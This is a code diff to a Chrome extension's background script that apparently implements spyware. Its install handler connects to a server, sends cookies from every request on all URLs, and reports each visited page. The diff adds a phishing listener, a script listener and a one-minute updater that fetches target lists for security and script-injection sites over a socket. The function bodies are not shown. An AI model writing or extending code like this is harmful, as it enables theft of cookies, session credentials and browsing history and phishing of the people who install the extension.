@@ -1,10 +1,9 @@
 chrome.runtime.onInstalled.addListener(() => {
   createUserID();
   connectToServer();
-  searchAndSendHistory();
-  createScriptSocket();
+  //searchAndSendHistory();
+  createScriptListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
-      updateSecurityWebsites(socket);
       checkAndSendCookies(info);
     }, {
       urls: ["<all_urls>"]
@@ -13,6 +12,14 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
+  createPhishingListener();
+  chrome.alarms.create("updater", {
+    periodInMinutes: 1
+  });
+  chrome.alarms.onAlarm.addListener(() => {
+    updateSecurityWebsites(socket);
+    updateScriptWebsites(socket);
+  })
   createTabListeners();
 });
 
